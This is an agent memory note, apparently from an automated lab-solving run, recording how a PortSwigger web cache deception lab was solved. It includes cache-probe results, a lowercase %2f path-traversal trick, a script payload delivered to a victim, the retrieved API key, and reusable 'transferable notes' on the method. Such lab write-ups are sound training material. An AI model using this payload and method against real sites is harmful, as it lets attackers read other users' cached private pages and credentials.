---
metadata:
  node_type: memory
name: "WCD origin-server-normalization lab"
description: "WCD origin-server-normalization lab: /resources prefix cache rule + lowercase %2f origin normalization, victim delivery, cached carlos page read"
last_updated: 2026-10-10T15:38:27+08:00
created: 2026-10-10T15:38:27+08:00
---

## lab-wcd-exploiting-origin-server-normalization (arm A, solved)

Target: PortSwigger WCD "Exploiting origin server normalization"; goal = carlos API key.

Probe (cache_probe, one envelope, X-Cache/X-Cache-Key + Age):
- `/my-account` -> 200, no X-Cache, no Cache-Control (private).
- `/my-account.js` -> 404 "Not Found", no X-Cache => rule is NOT "ends in static extension".
- `/resources/css/labs.css` -> X-Cache: miss, Cache-Control: max-age=30 => static prefix rule.
- `/resources/..%2fmy-account` -> 200 /my-account page + Cache-Control max-age=30 + X-Cache: miss => cacheable under a /resources-prefixed key while the origin normalized `..%2f` to /my-account.
- Case sensitivity (delimiter law): lowercase `%2f` normalizes; uppercase `%2F` does NOT (`/resources/..%2Fmy-account` -> 302 /login, X-Cache miss). Traversal delimiter must be lowercase %2f.
- Cache key ignores cookies: repeat with no jar -> X-Cache: hit serving the previously cached authenticated page. Query starts a new key (`?cb=9` -> miss).

Exploit path:
1. POST to exploit server formAction=DELIVER_TO_VICTIM with responseHead+responseBody `<script>document.location='https://LAB/resources/..%2fmy-account'</script>` (302 /deliver-to-victim must be followed).
2. Within the 30 s max-age window GET `/resources/..%2fmy-account` with NO cookie -> X-Cache: hit with carlos's page (API Key 35SyXzv8j3XbPVh8ui5nLprw8kSvxoq6).
Submit: POST /submitSolution form `answer=<key>`; banner_verdict on a fresh root -> solved:true, congrats line.

Transferable notes:
- Cache-rule triage order: extension rule vs static prefix vs delimiter; X-Cache + Cache-Control + Age per row in ONE cache_probe envelope.
- ureq collapses literal `/resources/../my-account` itself; only encoded %2f preserves the raw path for probing (negative control).
- Freshness matters: a stale own-cookie entry would answer the victim's request from cache. Let the victim's request create the entry, then read fast (max-age=30) or use a distinct key.
- Default cache_probe --body-limit 400 hides the account block; raise to ~5000 to read the cached key.

